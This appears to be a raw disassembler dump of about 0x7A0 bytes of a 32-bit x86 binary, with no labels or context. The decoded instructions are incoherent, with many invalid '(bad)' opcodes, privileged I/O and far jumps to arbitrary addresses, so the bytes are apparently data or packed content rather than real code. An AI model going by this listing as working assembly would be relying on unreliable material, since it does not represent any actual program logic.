  4194e9:	xor    BYTE PTR [eax+0x4cd77087],0x22
  4194f0:	adc    BYTE PTR [eax+0x1390591e],al
  4194f6:	cmp    BYTE PTR [ebx],0x35
  4194f9:	inc    eax
  4194fa:	shr    DWORD PTR [edi+0x61],1
  4194fd:	adc    ebp,DWORD PTR [ecx]
  4194ff:	dec    ebx
  419500:	inc    ecx
  419501:	pop    eax
  419502:	jmp    0xeed88615
  419507:	neg    ecx
  419509:	aad    0xcc
  41950b:	pop    edi
  41950c:	or     BYTE PTR [ecx-0x507f0ab],bh
  419512:	jp     0x4194fe
  419514:	push   0x4f
  419516:	lock jne 0x419585
  419519:	mov    al,0xc2
  41951b:	xchg   BYTE PTR [ebx-0x3e39c190],ah
  419521:	mov    eax,ds:0x9ee318fe
  419526:	cmp    al,0x52
  419528:	loope  0x419558
  41952a:	push   0x39
  41952c:	cmp    eax,0x8abca8a
  419531:	sub    dh,BYTE PTR [edx+0x18b20d2b]
  419537:	cs clc 
  419539:	es mov bh,0x32
  41953c:	popf   
  41953d:	pop    esp
  41953e:	mov    BYTE PTR [ecx+eiz*4-0x8c26b18],bh
  419545:	or     dh,ch
  419547:	lea    eax,[edi]
  419549:	xchg   BYTE PTR [edx],bh
  41954b:	xchg   edx,eax
  41954c:	push   cs
  41954d:	inc    esi
  41954e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41954f:	clc    
  419550:	xlat   BYTE PTR ds:[ebx]
  419551:	repnz mov cl,0x1c
  419554:	or     BYTE PTR [ecx-0x48],ch
  419557:	push   0xc5edb94d
  41955c:	sbb    BYTE PTR [esi-0x61],0x4c
  419560:	cli    
  419561:	aaa    
  419562:	inc    esp
  419563:	dec    ebx
  419564:	sub    DWORD PTR [edi-0x2f],edx
  419567:	xchg   edx,eax
  419568:	add    esp,eax
  41956a:	lds    esp,FWORD PTR [ebp+0x36]
  41956d:	sbb    edi,DWORD PTR [ebx-0xa7a5b1f]
  419573:	fidiv  DWORD PTR [esi]
  419575:	jns    0x419505
  419577:	add    al,0x35
  419579:	mov    edi,0xf7d82aa3
  41957e:	stc    
  41957f:	popf   
  419580:	nop
  419581:	scas   eax,DWORD PTR es:[edi]
  419582:	mov    eax,0x67129ea7
  419587:	(bad)  
  419588:	fucomp st(5)
  41958a:	push   esp
  41958b:	or     BYTE PTR [ebp+0x25],al
  41958e:	fistp  QWORD PTR [eax-0x256f6be6]
  419594:	ror    DWORD PTR [edi],cl
  419596:	(bad)  
  419597:	stc    
  419598:	push   edx
  419599:	mov    ebx,?
  41959b:	(bad)  
  41959c:	push   0xef7e82d1
  4195a1:	sub    bh,ah
  4195a3:	in     al,dx
  4195a4:	pop    esi
  4195a5:	pop    ebp
  4195a6:	arpl   bp,ax
  4195a8:	cs jmp 0x69c86a12
  4195ae:	adc    eax,DWORD PTR [esi]
  4195b0:	push   ds
  4195b1:	push   ebx
  4195b2:	sub    dh,0x9
  4195b5:	xor    DWORD PTR [ecx],ecx
  4195b7:	fwait
  4195b8:	cdq    
  4195b9:	adc    eax,0x24241a74
  4195be:	fimul  DWORD PTR [ebx+0xbad8976]
  4195c4:	outs   dx,DWORD PTR ds:[esi]
  4195c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195c6:	stos   DWORD PTR es:[edi],eax
  4195c7:	or     esp,DWORD PTR [ebp+0x29f8bd3d]
  4195cd:	mov    al,0xb4
  4195cf:	pop    eax
  4195d0:	add    al,0x9a
  4195d2:	push   esp
  4195d3:	ins    DWORD PTR es:[edi],dx
  4195d4:	push   ss
  4195d5:	mov    cs,edi
  4195d7:	adc    cl,dh
  4195d9:	lods   eax,DWORD PTR ds:[esi]
  4195da:	stc    
  4195db:	pop    ebp
  4195dc:	in     eax,dx
  4195dd:	jle    0x4195f5
  4195df:	(bad)  
  4195e0:	imul   BYTE PTR [ecx-0x3b]
  4195e3:	push   eax
  4195e4:	je     0x41961a
  4195e6:	stos   DWORD PTR es:[edi],eax
  4195e7:	mov    esi,0xaaf81689
  4195ec:	enter  0xb632,0x91
  4195f0:	sbb    ah,al
  4195f2:	dec    edi
  4195f3:	sub    DWORD PTR [eax+0x3b70160],0xac490fa8
  4195fd:	or     DWORD PTR [edi],0x711054f2
  419603:	out    dx,eax
  419604:	jbe    0x41959e
  419606:	(bad)  [edi+0x2f83a25c]
  41960c:	dec    eax
  41960d:	setbe  BYTE PTR [esi-0x7]
  419611:	lods   al,BYTE PTR ds:[esi]
  419612:	int3   
  419613:	sub    BYTE PTR [esi-0x1568a13f],0x58
  41961a:	sbb    esp,edi
  41961c:	test   eax,0x8585ef5e
  419621:	out    0x48,al
  419623:	test   BYTE PTR [ebx+0x34],ch
  419626:	or     BYTE PTR [ecx-0x1b],al
  419629:	retf   0x8a63
  41962c:	jl     0x4195e8
  41962e:	(bad)  
  41962f:	jl     0x419634
  419631:	jecxz  0x419636
  419633:	inc    ebx
  419634:	add    al,0x46
  419636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419637:	pop    ds
  419638:	jp     0x41961e
  41963a:	sbb    DWORD PTR [eax+0x7b83be85],ecx
  419640:	or     eax,0x5a56c428
  419645:	ret    0x8f02
  419648:	xor    ebp,DWORD PTR [ebx]
  41964a:	sahf   
  41964b:	aam    0x4b
  41964d:	iret   
  41964e:	test   cl,ch
  419650:	and    al,0xac
  419652:	retf   
  419653:	sub    ch,BYTE PTR [edi+edx*2+0x12]
  419657:	or     BYTE PTR [esi-0x22],0x2e
  41965b:	sub    bl,bl
  41965d:	rcl    BYTE PTR [edx+0x61],1
  419660:	addr16 push ds
  419662:	and    ch,ch
  419664:	inc    ebx
  419665:	aad    0xd4
  419667:	dec    esp
  419668:	sbb    BYTE PTR [ebp+0x773d53e4],0x8a
  41966f:	inc    esp
  419670:	xchg   ecx,eax
  419671:	popa   
  419672:	mov    esi,0x7c0a94a
  419677:	(bad)  
  419679:	push   edx
  41967a:	out    dx,eax
  41967b:	adc    ch,BYTE PTR [edx-0x4ea74e7b]
  419681:	push   edx
  419682:	(bad)  
  419683:	in     al,0xa0
  419685:	clc    
  419686:	xchg   esi,eax
  419687:	dec    ebx
  419688:	(bad)  
  419689:	mov    ebp,0xcccc0a7
  41968e:	jge    0x419694
  419690:	aas    
  419691:	out    dx,eax
  419692:	js     0x41969a
  419694:	outs   dx,DWORD PTR ds:[esi]
  419695:	stos   BYTE PTR es:[edi],al
  419696:	sbb    edx,DWORD PTR [edi+0x7a]
  419699:	shr    al,0x69
  41969c:	ret    0x63bf
  41969f:	imul   edi,esp,0x76
  4196a2:	jp     0x419697
  4196a4:	inc    eax
  4196a5:	jae    0x419701
  4196a7:	inc    ebp
  4196a8:	pushf  
  4196a9:	and    edi,esp
  4196ab:	jns    0x419659
  4196ad:	bound  esp,QWORD PTR [esi-0x52]
  4196b0:	addr16 stc 
  4196b2:	ds aas 
  4196b4:	call   FWORD PTR [ecx+0x33]
  4196b7:	repnz dec eax
  4196b9:	dec    eax
  4196bb:	les    esi,FWORD PTR ss:[edi]
  4196be:	paddd  mm6,QWORD PTR [ebp+0x7e]
  4196c2:	and    bl,BYTE PTR cs:[ecx-0x260923d3]
  4196c9:	test   BYTE PTR [eax-0x69c86edc],0xf4
  4196d0:	in     al,dx
  4196d1:	push   esp
  4196d2:	sub    al,0x36
  4196d4:	daa    
  4196d5:	adc    BYTE PTR ds:0xd571870f,0x90
  4196dc:	or     eax,0x4b204b65
  4196e1:	je     0x419675
  4196e3:	or     dl,ah
  4196e5:	xchg   esp,eax
  4196e6:	cmp    DWORD PTR [esi+0x373053e6],ebx
  4196ec:	xlat   BYTE PTR ds:[ebx]
  4196ed:	popf   
  4196ee:	xor    al,0x2
  4196f0:	(bad)  
  4196f2:	mov    cl,0x8b
  4196f4:	mov    eax,0x900ddb1
  4196f9:	sub    al,0xe7
  4196fb:	frstor [ecx+0x332b4a43]
  419701:	std    
  419702:	repz adc ebp,DWORD PTR [edx+0x21]
  419706:	push   edi
  419707:	fst    DWORD PTR [ecx-0x4f]
  41970a:	imul   ebx,DWORD PTR [edi+0x50],0xc2ecd2c7
  419711:	(bad)  
  419712:	(bad)  
  419713:	repz pop edi
  419715:	push   ebp
  419716:	dec    edx
  419717:	jmp    0x372186d7
  41971c:	iret   
  41971d:	idiv   BYTE PTR [edi-0x6cbaa6]
  419723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419724:	jg     0x419784
  419726:	int    0xcf
  419728:	leave  
  419729:	inc    esp
  41972a:	push   ds
  41972b:	js     0x4197a4
  41972d:	ret    0xbdda
  419730:	sahf   
  419731:	jnp    0x4196fd
  419733:	xchg   esp,eax
  419734:	shl    BYTE PTR [edi],1
  419736:	pop    ss
  419737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419738:	pusha  
  419739:	jl     0x419782
  41973b:	inc    edi
  41973c:	cdq    
  41973d:	push   ebx
  41973e:	sub    ebp,ecx
  419740:	xlat   BYTE PTR ds:[ebx]
  419741:	sbb    al,BYTE PTR [edi+0x1c8a45aa]
  419747:	cdq    
  419748:	push   0x25
  41974a:	sti    
  41974b:	jns    0x41979a
  41974d:	xor    esp,DWORD PTR [eax+0x66]
  419750:	test   ebp,ecx
  419752:	mov    eax,0x13e11675
  419757:	repz add eax,0x2b81d314
  41975d:	adc    BYTE PTR [di+0x99f],dh
  419762:	and    esp,edx
  419764:	out    0xfd,al
  419766:	pop    es
  419767:	call   0x97cd:0xef1c985d
  41976e:	lods   al,BYTE PTR ds:[esi]
  41976f:	fist   WORD PTR [edi]
  419771:	xchg   esi,eax
  419772:	pop    edx
  419773:	push   esp
  419774:	jo     0x4197c6
  419776:	mov    edx,0x9dc22a77
  41977b:	inc    eax
  41977c:	jmp    0x4197bb
  41977e:	rcl    BYTE PTR [esi+eax*2-0x5c],cl
  419782:	add    BYTE PTR [ebx+0x52],0x2d
  419786:	sub    DWORD PTR [edx],ebp
  419788:	mov    ebx,0x18a384d0
  41978d:	call   0x7f64:0xbff4987e
  419794:	fstp   QWORD PTR [esi+0xd]
  419797:	(bad)  
  419798:	lds    esp,FWORD PTR [eax-0x2182a069]
  41979e:	xor    edi,DWORD PTR [eax+0x6d]
  4197a1:	push   ecx
  4197a2:	mov    ah,0x8c
  4197a4:	jp     0x419772
  4197a6:	dec    edi
  4197a7:	sbb    BYTE PTR [edx],ah
  4197a9:	shr    DWORD PTR [di],cl
  4197ac:	jg     0x41978e
  4197ae:	jg     0x41975b
  4197b0:	or     BYTE PTR [edx+0x61eae903],al
  4197b6:	and    BYTE PTR [edx-0x47],cl
  4197b9:	aas    
  4197ba:	in     eax,dx
  4197bb:	pop    esi
  4197bc:	jecxz  0x41981b
  4197be:	push   esi
  4197bf:	push   ebx
  4197c0:	test   al,0xf7
  4197c2:	addr16 fadd st,st(6)
  4197c5:	dec    ebp
  4197c6:	or     al,0xd7
  4197c8:	push   cs
  4197c9:	(bad)  
  4197ca:	ins    DWORD PTR es:[edi],dx
  4197cb:	xlat   BYTE PTR ds:[ebx]
  4197cc:	iret   
  4197cd:	and    BYTE PTR [ecx],cl
  4197cf:	ss int 0x6a
  4197d2:	bndstx [ebx],bnd2
  4197d5:	jae    0x419837
  4197d7:	add    cl,BYTE PTR ds:[ecx+0x6895d4ef]
  4197de:	call   0x81570b73
  4197e3:	jecxz  0x41982c
  4197e5:	aam    0x95
  4197e7:	adc    al,0x86
  4197e9:	jnp    0x419779
  4197eb:	xchg   edi,eax
  4197ec:	lods   eax,DWORD PTR ds:[esi]
  4197ed:	pop    ss
  4197ee:	ret    0x4f0c
  4197f1:	sub    DWORD PTR [esi-0x1ac3b482],edi
  4197f7:	iret   
  4197f8:	ins    DWORD PTR es:[edi],dx
  4197f9:	ja     0x41986d
  4197fb:	pushf  
  4197fc:	les    ecx,FWORD PTR [ebx+0x7]
  4197ff:	and    al,0x37
  419801:	pushf  
  419802:	xchg   ebx,eax
  419803:	jge    0x4197cb
  419805:	xor    bh,dh
  419807:	push   0x13578eb0
  41980c:	push   edx
  41980d:	jbe    0x41988d
  41980f:	loopne 0x41979e
  419811:	xchg   edi,eax
  419812:	cmp    DWORD PTR [edx+eax*1+0x9bf1a36],esi
  419819:	jg     0x419851
  41981b:	aad    0xc9
  41981d:	or     esp,DWORD PTR [eax+ebx*8+0x76ac62cb]
  419824:	cld    
  419825:	imul   BYTE PTR [esp+esi*8-0x32ae1a17]
  41982c:	xor    edx,DWORD PTR [ebx]
  41982e:	les    edx,FWORD PTR [edi+ecx*2]
  419831:	pop    eax
  419832:	cwde   
  419833:	pop    ebx
  419834:	mov    ah,BYTE PTR [edi+0x64]
  419837:	push   0x5a
  419839:	sbb    al,0x38
  41983b:	pop    eax
  41983c:	out    0xb5,eax
  41983e:	cmp    eax,0x73a1e60e
  419843:	aas    
  419844:	pop    ebx
  419845:	and    edi,DWORD PTR [edx-0x30103a0a]
  41984b:	sbb    DWORD PTR [eax],ecx
  41984d:	in     al,0x5
  41984f:	xchg   edx,eax
  419850:	pop    ds
  419851:	call   0x90ff:0x36b2f6b7
  419858:	cs jo  0x419818
  41985b:	or     al,0xba
  41985d:	rcr    BYTE PTR [edx],0xb0
  419860:	aad    0x37
  419862:	or     dl,BYTE PTR [esp+ebx*1]
  419865:	into   
  419866:	fs cmc 
  419868:	out    0x56,al
  41986a:	adc    DWORD PTR [ecx-0x3a0fa289],0xffffffb2
  419871:	outs   dx,BYTE PTR ds:[esi]
  419872:	sub    DWORD PTR [esi],ecx
  419874:	daa    
  419875:	out    dx,al
  419876:	sub    ecx,DWORD PTR [ebp+0x69]
  419879:	mov    al,0xf6
  41987b:	je     0x4198f2
  41987d:	xchg   DWORD PTR [ebx+0x5b1532b],eax
  419883:	loopne 0x4198a2
  419885:	inc    eax
  419886:	test   eax,0x1a32dde8
  41988b:	dec    edi
  41988c:	mov    dh,0x23
  41988e:	inc    ebx
  41988f:	aad    0x5b
  419891:	xchg   ebx,eax
  419892:	jg     0x4198d0
  419894:	dec    esi
  419895:	add    ch,dh
  419897:	jecxz  0x419834
  419899:	ss mov edx,0xf0ace2ce
  41989f:	and    ch,BYTE PTR [ebp+0x72c6bdaf]
  4198a5:	mov    bh,0x8f
  4198a7:	or     BYTE PTR [ebx],dh
  4198a9:	adc    BYTE PTR [ebp+0x67bc619e],dh
  4198af:	scas   al,BYTE PTR es:[edi]
  4198b0:	out    0xee,al
  4198b2:	mov    al,0x3a
  4198b4:	dec    esi
  4198b5:	out    0xde,eax
  4198b7:	test   al,0x38
  4198b9:	inc    ebx
  4198ba:	cld    
  4198bb:	(bad)  
  4198bc:	cdq    
  4198bd:	call   0x1d22:0xbb521d07
  4198c4:	(bad)  
  4198c5:	jle    0x4198c8
  4198c7:	sub    al,0x5
  4198c9:	gs daa 
  4198cb:	cld    
  4198cc:	xor    DWORD PTR [esi],ebx
  4198ce:	pop    ebp
  4198cf:	shr    DWORD PTR [eax+eiz*2+0x57fcc3a0],0x2f
  4198d7:	sbb    BYTE PTR [ebx],bl
  4198d9:	xchg   edx,eax
  4198da:	add    edi,DWORD PTR [esi-0x60b39e75]
  4198e0:	ja     0x4198c7
  4198e2:	iret   
  4198e3:	xchg   BYTE PTR [edx-0x41],cl
  4198e6:	cmp    eax,0x95159b3f
  4198eb:	jns    0x419948
  4198ed:	(bad)  
  4198ee:	cmp    eax,0x761d8bbc
  4198f3:	loopne 0x419914
  4198f5:	jmp    0xa29b:0x3860b8a1
  4198fc:	int    0x4f
  4198fe:	out    0xdc,al
  419900:	stos   DWORD PTR es:[edi],eax
  419901:	sar    DWORD PTR [edi],0x76
  419904:	or     BYTE PTR [ecx],cl
  419906:	push   edi
  419907:	mov    esi,0xdc915fc0
  41990c:	mov    ds:0x8d13c465,al
  419911:	enter  0xaa49,0x9d
  419915:	sub    eax,0xc7ba5cac
  41991a:	xor    DWORD PTR [edi+esi*4-0x62e166ca],ecx
  419921:	sbb    al,0x61
  419923:	dec    edx
  419924:	inc    edx
  419925:	in     eax,0x8d
  419927:	xor    DWORD PTR [eax-0xe],esi
  41992a:	out    0x19,al
  41992c:	add    dh,BYTE PTR [edi-0x15]
  41992f:	test   DWORD PTR ds:0xe46c7cb,esp
  419935:	mov    ebp,0x7ab374df
  41993a:	pop    ds
  41993b:	pop    ds
  41993c:	ret    0x46b7
  41993f:	xchg   BYTE PTR [ebp+0x2f],bl
  419942:	(bad)  
  419944:	push   edi
  419945:	inc    eax
  419946:	mov    WORD PTR [ebx],ss
  419948:	mov    ss,WORD PTR [ebp+0x1a]
  41994b:	iret   
  41994c:	and    al,0x9b
  41994e:	mov    al,0x2f
  419950:	pop    edi
  419951:	push   ss
  419952:	inc    edx
  419953:	js     0x4199a9
  419955:	jnp    0x419965
  419957:	adc    eax,0xe04cdc78
  41995c:	xchg   edx,eax
  41995d:	test   BYTE PTR [esp+ecx*2],cl
  419960:	out    0x8f,eax
  419962:	inc    edi
  419963:	xor    edx,DWORD PTR [edx+0x7aa4fcf4]
  419969:	sub    edi,DWORD PTR [ebx+0x481f2c3f]
  41996f:	push   ds
  419970:	fwait
  419971:	setno  bl
  419974:	pop    eax
  419975:	sbb    bl,BYTE PTR [ecx+0x4b06e659]
  41997b:	int    0x73
  41997d:	xor    edx,edx
  41997f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419980:	loopne 0x41996f
  419982:	adc    BYTE PTR [eax],bl
  419984:	sub    BYTE PTR [eax-0x4f],bh
  419987:	push   ss
  419988:	jno    0x419960
  41998a:	repnz pop edi
  41998c:	push   edx
  41998d:	adc    bl,al
  41998f:	jge    0x4199d2
  419991:	das    
  419992:	loopne 0x4199be
  419994:	cmp    ebp,edx
  419996:	pop    edi
  419997:	jmp    0x4199ef
  419999:	pop    ecx
  41999a:	xchg   edi,eax
  41999b:	cdq    
  41999c:	mov    esi,0x4a752ce8
  4199a1:	add    al,BYTE PTR [edx]
  4199a3:	leave  
  4199a4:	adc    BYTE PTR [ecx+ecx*4],dh
  4199a7:	pop    ebx
  4199a8:	mov    esp,0x69da38b3
  4199ad:	adc    al,BYTE PTR [edx]
  4199af:	cli    
  4199b0:	jne    0x419978
  4199b2:	adc    dh,0x19
  4199b5:	xchg   edx,eax
  4199b6:	ror    esp,1
  4199b8:	adc    dl,BYTE PTR [ebx+0x5c]
  4199bb:	push   ds
  4199bc:	adc    al,0x5b
  4199be:	imul   ebp,edx,0xaa2fb470
  4199c4:	fwait
  4199c5:	inc    ebp
  4199c6:	or     BYTE PTR [edx+ebx*1],dh
  4199c9:	icebp  
  4199ca:	pop    es
  4199cb:	outs   dx,DWORD PTR ds:[esi]
  4199cc:	ss int 0xe4
  4199cf:	data16 ficom DWORD PTR [eax+edi*1-0x4bfff7c6]
  4199d7:	or     DWORD PTR [ecx-0x16],eax
  4199da:	xor    ah,BYTE PTR [edx+0x7e79e2eb]
  4199e0:	xchg   ebp,eax
  4199e1:	inc    edi
  4199e2:	push   ss
  4199e3:	js     0x419966
  4199e5:	pop    ds
  4199e6:	stc    
  4199e7:	leave  
  4199e8:	test   al,0xf7
  4199ea:	jbe    0x4199fc
  4199ec:	push   ebx
  4199ed:	push   ebp
  4199ee:	add    BYTE PTR [ecx],dl
  4199f0:	nop
  4199f1:	inc    edx
  4199f2:	mov    BYTE PTR [eax-0x3d],al
  4199f5:	sahf   
  4199f6:	jge    0x419986
  4199f8:	in     eax,0x2f
  4199fa:	daa    
  4199fb:	mov    esi,fs
  4199fd:	sbb    bh,cl
  4199ff:	xor    eax,0xca6ee447
  419a04:	mov    al,0x68
  419a06:	or     edi,DWORD PTR [ebx+edi*1-0xc03fcdd]
  419a0d:	and    eax,0x2d9710fd
  419a12:	repnz push edi
  419a14:	clc    
  419a15:	dec    ebx
  419a16:	outs   dx,DWORD PTR ds:[esi]
  419a17:	cmc    
  419a18:	mov    ebp,0xefb6e674
  419a1d:	call   0xfdfd:0xe77fdad1
  419a24:	aas    
  419a25:	stc    
  419a26:	inc    ebx
  419a27:	mov    esp,0xd97e55ec
  419a2c:	cwde   
  419a2d:	arpl   WORD PTR [esi+0x2427a68e],ax
  419a33:	daa    
  419a34:	rcl    DWORD PTR [eax-0x3d],0x73
  419a38:	call   0x3ec6:0x5ee15ffa
  419a3f:	fstp   DWORD PTR [ecx+ecx*8]
  419a42:	and    eax,0x1bb58860
  419a47:	cmp    ebp,DWORD PTR [ecx-0x3c]
  419a4a:	in     eax,0xe7
  419a4c:	fwait
  419a4d:	xlat   BYTE PTR ds:[ebx]
  419a4e:	pop    eax
  419a4f:	jae    0x419a8c
  419a51:	clc    
  419a52:	xchg   esi,eax
  419a53:	xor    al,0xb9
  419a55:	pop    ss
  419a56:	xchg   DWORD PTR [ebp+0x19],esi
  419a59:	shl    BYTE PTR [ebx+0x43],0x54
  419a5d:	sbb    ebp,DWORD PTR [edi]
  419a5f:	push   es
  419a60:	xchg   ebx,eax
  419a61:	arpl   WORD PTR [edi],di
  419a63:	fstp   TBYTE PTR [edi-0x4b]
  419a66:	lods   eax,DWORD PTR ds:[esi]
  419a67:	sub    BYTE PTR [ebx+0x151a0596],0xf
  419a6e:	cmp    dl,BYTE PTR ss:[ecx+0x7aa0923f]
  419a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a76:	pop    esp
  419a77:	jb     0x419aba
  419a79:	cdq    
  419a7a:	pop    ebx
  419a7b:	icebp  
  419a7c:	cs in  al,dx
  419a7e:	rcr    DWORD PTR [esi-0x2d8c8691],1
  419a84:	inc    ecx
  419a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a86:	adc    al,0xc5
  419a88:	ds jge 0x419a7b
  419a8b:	adc    BYTE PTR [ebp+0x7b],0xb
  419a8f:	xchg   esi,eax
  419a90:	vshufps xmm2,xmm2,XMMWORD PTR [ebx],0x40
  419a95:	jl     0x419a7d
  419a97:	sub    eax,0x6d70890b
  419a9c:	mov    eax,eax
  419a9e:	retf   0x6aae
  419aa1:	(bad)  
  419aa3:	xor    al,BYTE PTR fs:[ebp+0x35f52a28]
  419aaa:	add    al,0x85
  419aac:	call   0xc696cbc2
  419ab1:	jo     0x419b31
  419ab3:	mov    WORD PTR [edx-0x77b08f43],?
  419ab9:	jp     0x419ab8
  419abb:	aas    
  419abc:	lods   eax,DWORD PTR ds:[esi]
  419abd:	jns    0x419af4
  419abf:	ret    
  419ac0:	inc    esi
  419ac1:	xor    DWORD PTR [ebx+0x4c],ecx
  419ac4:	jge    0x419ab1
  419ac6:	mov    cl,0x1b
  419ac8:	loope  0x419b39
  419aca:	push   esi
  419acb:	rcl    BYTE PTR [edx-0x2d],cl
  419ace:	adc    eax,ecx
  419ad0:	test   al,0x4
  419ad2:	pop    ds
  419ad3:	adc    BYTE PTR [esi],dh
  419ad5:	mov    dh,0xdd
  419ad7:	cmp    eax,DWORD PTR [ebx+ebx*8]
  419ada:	sar    BYTE PTR [edi],cl
  419adc:	jecxz  0x419b34
  419ade:	call   0xb488:0xeda14528
  419ae5:	bound  esi,QWORD PTR [ecx+0x42]
  419ae8:	mov    cl,0x9
  419aea:	or     ebp,DWORD PTR ds:0x8b2d2b1
  419af0:	and    dl,BYTE PTR [ecx+edx*1]
  419af3:	add    DWORD PTR [edi],esp
  419af5:	ja     0x419b40
  419af7:	push   cs
  419af8:	adc    DWORD PTR [esi+0x79],ebx
  419afb:	shl    ebp,0x1d
  419afe:	fcomp  DWORD PTR [edx+ecx*4]
  419b01:	inc    ebp
  419b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b03:	gs daa 
  419b05:	mov    dh,0x82
  419b07:	lea    esp,[ebx-0x42]
  419b0a:	test   eax,0x7e3cb8e6
  419b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b10:	mov    BYTE PTR [edx+0x70ef02e2],bl
  419b16:	or     eax,0x190dfea
  419b1b:	mov    bh,0x30
  419b1d:	lds    edx,FWORD PTR [eax+0x11]
  419b20:	fbld   TBYTE PTR [ebp-0x12d2591f]
  419b26:	xor    eax,0x3025ccbb
  419b2b:	or     eax,0xe13c9a84
  419b30:	pop    eax
  419b31:	mov    esp,0xdafe0223
  419b36:	(bad)  
  419b37:	clc    
  419b38:	fidiv  DWORD PTR [edi+0x43f02ee5]
  419b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3f:	push   esp
  419b40:	jg     0x419b27
  419b42:	inc    ecx
  419b43:	fdiv   DWORD PTR cs:[edx]
  419b46:	fimul  WORD PTR [ebx-0x7e6cd4ee]
  419b4c:	dec    ebx
  419b4d:	es cld 
  419b4f:	(bad)  
  419b50:	dec    ebx
  419b51:	mov    WORD PTR [ebp-0x3f880432],cs
  419b57:	fstp   QWORD PTR [eax-0x6b]
  419b5a:	and    ecx,esp
  419b5c:	inc    ebp
  419b5d:	arpl   WORD PTR [ebp-0x69],di
  419b60:	aaa    
  419b61:	dec    edx
  419b62:	mov    eax,0xbc73c6cf
  419b67:	push   ds
  419b68:	sub    al,0xcc
  419b6a:	call   0x1b35ecb
  419b6f:	inc    ebx
  419b70:	icebp  
  419b71:	or     BYTE PTR [edx+0x65],bh
  419b74:	mov    bl,0x43
  419b76:	lods   eax,DWORD PTR ds:[esi]
  419b77:	push   edi
  419b78:	sbb    cl,BYTE PTR [edi+0x5a]
  419b7b:	jmp    0x9f16be00
  419b80:	push   0x3b
  419b82:	mov    ecx,?
  419b84:	(bad)  
  419b85:	mov    dh,0x96
  419b87:	jecxz  0x419b10
  419b89:	dec    esi
  419b8a:	les    ebp,FWORD PTR [edx+0xc]
  419b8d:	xor    bh,cl
  419b8f:	sub    BYTE PTR [esi],ch
  419b91:	gs mov ch,0x27
  419b94:	or     ch,cl
  419b96:	adc    ebp,DWORD PTR [esi-0x330d7ca1]
  419b9c:	pop    ebx
  419b9d:	xlat   BYTE PTR ds:[ebx]
  419b9e:	adc    edi,0xb2677b47
  419ba4:	imul   esi,ecx,0xffffffcc
  419ba7:	in     al,0x2
  419ba9:	ret    0xda3b
  419bac:	(bad)  
  419bad:	xchg   ebp,eax
  419bae:	(bad)  
  419baf:	fwait
  419bb0:	push   0x23
  419bb2:	and    DWORD PTR [edi-0x4f62cf51],edx
  419bb8:	dec    ebp
  419bb9:	test   DWORD PTR ds:0x35f7f22b,0x27d6841e
  419bc3:	iret   
  419bc4:	sub    eax,0xf39bc746
  419bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bca:	and    eax,0x8c85c5ff
  419bcf:	lock lods al,BYTE PTR ds:[esi]
  419bd1:	ja     0x419b6d
  419bd3:	jnp    0x419bff
  419bd5:	clc    
  419bd6:	pop    ebp
  419bd7:	outs   dx,DWORD PTR ds:[esi]
  419bd8:	pop    eax
  419bd9:	pop    esi
  419bda:	dec    ebx
  419bdb:	iret   
  419bdc:	fist   DWORD PTR [eax]
  419bde:	ins    BYTE PTR es:[edi],dx
  419bdf:	ret    
  419be0:	js     0x419ba2
  419be2:	pop    ss
  419be3:	mov    edi,0x94b2a547
  419be8:	dec    edx
  419be9:	js     0x419b8a
  419beb:	xchg   esp,eax
  419bec:	je     0x419b86
  419bee:	or     ah,ch
  419bf0:	fwait
  419bf1:	outs   dx,DWORD PTR ds:[esi]
  419bf2:	lahf   
  419bf3:	imul   ebx,DWORD PTR [ebx-0x4e],0xd119ca54
  419bfa:	sub    cl,dh
  419bfc:	out    0xda,eax
  419bfe:	adc    BYTE PTR [edx-0x65],bh
  419c01:	push   ebx
  419c02:	int3   
  419c03:	mov    ch,0x7
  419c05:	leave  
  419c06:	icebp  
  419c07:	jns    0x419bb2
  419c09:	sbb    DWORD PTR [ebx],ebp
  419c0b:	mov    esi,0x180ef05a
  419c10:	mov    ebp,0x1d46d727
  419c15:	in     al,0xa7
  419c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c18:	adc    eax,0x321abe6b
  419c1d:	mov    esi,0x9c819107
  419c22:	adc    ebp,DWORD PTR [eax-0x2c11b2e5]
  419c28:	fwait
  419c29:	jecxz  0x419bc1
  419c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c2c:	sub    ebx,ebx
  419c2e:	(bad)  
  419c2f:	idiv   BYTE PTR [esi]
  419c31:	sar    DWORD PTR [esi+0x60],1
  419c34:	loop   0x419cb1
  419c36:	dec    ebp
  419c37:	outs   dx,DWORD PTR ds:[esi]
  419c38:	push   0x28
  419c3a:	into   
  419c3b:	xor    al,0x86
  419c3d:	jae    0x419c68
  419c3f:	les    ebp,FWORD PTR [esi]
  419c41:	out    dx,al
  419c42:	sbb    eax,0x485e088c
  419c47:	pop    eax
  419c48:	ja     0x419c9e
  419c4a:	mov    BYTE PTR ds:[eax-0x23d14c7b],dh
  419c51:	cmc    
  419c52:	and    ebx,DWORD PTR [ecx]
  419c54:	adc    DWORD PTR [eax-0x42659b33],ebp
  419c5a:	les    ecx,FWORD PTR [ebx]
  419c5c:	adc    al,0xe7
  419c5e:	stos   DWORD PTR es:[edi],eax
  419c5f:	push   0xffffffb8
  419c61:	gs dec edx
  419c64:	bswap  ebx
  419c66:	mov    al,0x7f
  419c68:	jp     0x419ca2
  419c6a:	mov    dh,0x4b
  419c6c:	xchg   esi,eax
  419c6d:	sbb    al,0x90
  419c6f:	and    eax,0x2f9db129
  419c74:	std    
  419c75:	out    0xa7,eax
  419c77:	loop   0x419ca2
  419c79:	imul   BYTE PTR [ebx+edi*1-0x31314664]
  419c80:	push   ss
  419c81:	pop    edx
  419c82:	fld    TBYTE PTR [esp+esi*4+0x69f57075]
  419c89:	popa   
  419c8a:	mov    DWORD PTR [esi],ebx
  419c8c:	mov    WORD PTR [esi+eax*8],fs
